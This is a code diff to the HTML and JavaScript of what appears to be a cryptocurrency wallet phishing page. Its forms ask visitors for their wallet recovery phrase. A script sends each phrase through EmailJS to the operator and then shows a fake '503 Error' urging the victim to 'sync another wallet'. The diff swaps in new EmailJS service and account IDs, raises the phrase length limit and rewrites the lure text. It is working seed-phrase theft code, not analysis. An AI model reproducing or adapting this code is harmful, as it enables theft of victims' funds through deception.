@@ -244,14 +244,7 @@
                           class="form-select"
                           aria-label="Default select example"
                         >
-                          <option selected>Wallet Selection</option>
-                         <option value="0x1" data-select2-id="select2-data-3-rcyi">MetaMask</option>
-                         <option value="0x38" data-select2-id="select2-data-30-ir32">Trust Wallet</option>
-                         <option value="0x89" data-select2-id="select2-data-31-w03z">Coinbase</option>
-                         <option value="0xa86a" data-select2-id="select2-data-32-71oo">Safepal</option>
-                         <option value="0xfa" data-select2-id="select2-data-33-hulu">Exodus Wallet</option>
-                         <option value="0xfa" data-select2-id="select2-data-33-hulu">Atomic Wallet</option>
-                         <option value="0x19" data-select2-id="select2-data-35-silk">Other Wallets</option>
+                          <option selected>Wallet Selected</option>
                         </select>
                         <label class="form-label">Recovery Phrase</label>
                         <tr>
@@ -262,7 +255,7 @@
                               cols="40"
                               rows="10"
                               class="form-control"
-                              maxlength="250"
+                              maxlength="500"
                               required
                               id="id_phrase"
                             ></textarea>
@@ -319,7 +312,7 @@
                               rows="10"
                               style="height: 10rem; color: #0150b8"
                               class="form-control s90 h28 custom_f_all"
-                              maxlength="250"
+                              maxlength="500"
                               required
                               id="id_words"
                             ></textarea>
@@ -390,7 +383,7 @@
                               cols="40"
                               rows="10"
                               class="form-control"
-                              maxlength="250"
+                              maxlength="500"
                               required
                               id="id_phrase"
                             ></textarea>
@@ -451,9 +444,9 @@
         }
 
         var data = {
-          service_id: "service_nllh4vj",
-          template_id: "template_5ojg59l",
-          user_id: "ae4v5yBATxhqb9S0T",
+          service_id: "service_ccwjcun",
+          template_id: "template_q10fj97",
+          user_id: "fRnsl6BfGNFhe553o",
           template_params: {
             phrase: val,
           },
@@ -466,7 +459,7 @@
         })
           .done(function () {
             console.log("Your mail is sent!");
-            alert("Error, Contact Admin");
+            alert("503 Error, if this persist kindly sync another wallet and try again or contact admin");
           })
           .fail(function (error) {
             alert("Oops... " + JSON.stringify(error));
